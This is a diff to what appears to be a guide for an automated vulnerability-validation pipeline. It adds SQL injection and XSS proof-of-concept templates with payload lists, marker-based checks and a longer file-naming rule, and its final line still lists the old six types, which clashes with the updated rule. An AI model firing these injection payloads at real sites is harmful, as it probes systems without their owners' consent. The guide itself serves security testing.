@@ -180,12 +180,107 @@ def exploit(target, timeout):
 
 | Type | Key Technique | Validation |
 |------|--------------|------------|
-| RCE | Unique marker via eval/exec/template injection | Marker in response |
-| SSRF | Internal URL injection + listener | Listener receives connection |
-| Insecure Deserialization | Malicious pickle/YAML payload | Marker file created |
-| Arbitrary File R/W | Write marker, read it back | Marker file verified |
-| DoS | ReDoS, nested JSON, XML bomb | 10x response time increase |
-| Command Injection | Shell metacharacters + marker | Marker in response |
+| RCE | Unique marker via eval/exec/template injection | TCP listener on 59875 receives `test_message` |
+| SSRF | Internal URL injection + listener | TCP listener on 59876 receives connection |
+| Insecure Deserialization | Malicious pickle/YAML payload | `/tmp/deserialized_flag` created |
+| Arbitrary File R/W | Write marker, read it back | inotifywait detects access on `/tmp/flag` |
+| DoS | ReDoS, nested JSON, XML bomb | 10× response time increase |
+| Command Injection | Shell metacharacters + marker | TCP listener on 59875 receives `test_message` |
+| SQL Injection | Error-based/time-based/boolean/union injection via HTTP | SQL error in response OR time delay >= 4× OR boolean diff OR marker in response |
+| XSS | Unique marker reflected unescaped in HTML response | Unique marker found unescaped in response body |
+
+### SQL Injection PoC Pattern
+
+```python
+# For SQL injection: inject via HTTP parameter, validate via response analysis
+import re, time
+
+SQL_PAYLOADS = [
+    ("'", "error-based"),
+    ("' AND SLEEP(5)--", "time-based-mysql"),
+    ("'; WAITFOR DELAY '0:0:5'--", "time-based-mssql"),
+    ("'; SELECT pg_sleep(5)--", "time-based-postgres"),
+    ("' AND 1=1--", "boolean-true"),
+    ("' AND 1=2--", "boolean-false"),
+    ("' UNION SELECT 'SQLI_CONFIRMED',NULL--", "union-based"),
+]
+
+SQL_ERROR_PATTERNS = re.compile(
+    r'sql syntax|syntax error|mysql_error|pg_query|ORA-\d+|'
+    r'SQLite.*error|ODBC.*error|Unclosed quotation mark|'
+    r'You have an error in your SQL|unterminated quoted string',
+    re.IGNORECASE
+)
+
+def exploit(target, timeout):
+    # Baseline timing
+    baseline_times = []
+    for _ in range(3):
+        t = time.time()
+        requests.get(f"{target}/endpoint", params={"id": "1"}, timeout=timeout)
+        baseline_times.append(time.time() - t)
+    baseline = sum(baseline_times) / len(baseline_times)
+
+    for payload, technique in SQL_PAYLOADS:
+        try:
+            start = time.time()
+            resp = requests.get(f"{target}/endpoint", params={"id": payload}, timeout=timeout)
+            elapsed = time.time() - start
+
+            # Error-based
+            if SQL_ERROR_PATTERNS.search(resp.text):
+                return {"technique": technique, "evidence": f"SQL error: {resp.text[:300]}"}
+
+            # Time-based (>= 4x baseline)
+            if elapsed >= max(4.0, baseline * 4) and "sleep" in technique:
+                return {"technique": technique, "evidence": f"Time delay: {elapsed:.2f}s vs baseline {baseline:.2f}s"}
+
+            # Union-based marker
+            if "SQLI_CONFIRMED" in resp.text:
+                return {"technique": technique, "evidence": f"Union injection: marker 'SQLI_CONFIRMED' in response"}
+
+        except Exception:
+            continue
+    return None
+
+def validate(result):
+    return result is not None
+```
+
+### XSS PoC Pattern
+
+```python
+# For XSS: inject unique marker, verify it appears unescaped in HTML response
+import secrets, re
+
+MARKER = f"xss_{secrets.token_hex(8)}"
+
+XSS_PAYLOADS = [
+    f'<script>"{MARKER}"</script>',
+    f'" onmouseover="{MARKER}" x="',
+    f'<svg onload="{MARKER}">',
+    f'<img src=x onerror="{MARKER}">',
+    f"<body onload='{MARKER}'>",
+]
+
+def exploit(target, timeout):
+    for payload in XSS_PAYLOADS:
+        try:
+            resp = requests.get(f"{target}/endpoint",
+                                params={"q": payload}, timeout=timeout)
+            if MARKER in resp.text:
+                # Verify not HTML-escaped
+                if not re.search(r'&lt;|&gt;|&quot;|&#39;|&amp;',
+                                 resp.text[max(0, resp.text.find(MARKER)-30):resp.text.find(MARKER)+30]):
+                    return {"payload": payload, "marker": MARKER,
+                            "snippet": resp.text[max(0,resp.text.find(MARKER)-50):resp.text.find(MARKER)+80]}
+        except Exception:
+            continue
+    return None
+
+def validate(result):
+    return result is not None and result.get("marker") == MARKER
+```
 
 ## Naming Convention (MANDATORY)
 
@@ -199,6 +294,8 @@ poc_command_injection_003.py
 poc_insecure_deserialization_004.py
 poc_arbitrary_file_rw_005.py
 poc_dos_006.py
+poc_sql_injection_007.py
+poc_xss_008.py
 ```
 
 **ANTI-PATTERNS (FORBIDDEN — observed in actual pipeline runs)**:
@@ -222,7 +319,7 @@ poc_ssrf_retry.py                # WRONG: "_retry" suffix with no number at all
 poc_rce_003_retry.py             # WRONG: "_retry" suffix appended after number
 ```
 
-**The ONLY valid pattern is**: `poc_<type>_<NNN>.py` where `<type>` is exactly one of `rce`, `ssrf`, `insecure_deserialization`, `arbitrary_file_rw`, `dos`, `command_injection` and `<NNN>` is a 3-digit zero-padded number.
+**The ONLY valid pattern is**: `poc_<type>_<NNN>.py` where `<type>` is exactly one of `rce`, `ssrf`, `insecure_deserialization`, `arbitrary_file_rw`, `dos`, `command_injection`, `sql_injection`, `xss` and `<NNN>` is a 3-digit zero-padded number.
 
 The `<type>` MUST be an exact match to one of: `rce`, `ssrf`, `insecure_deserialization`, `arbitrary_file_rw`, `dos`, `command_injection`.
 
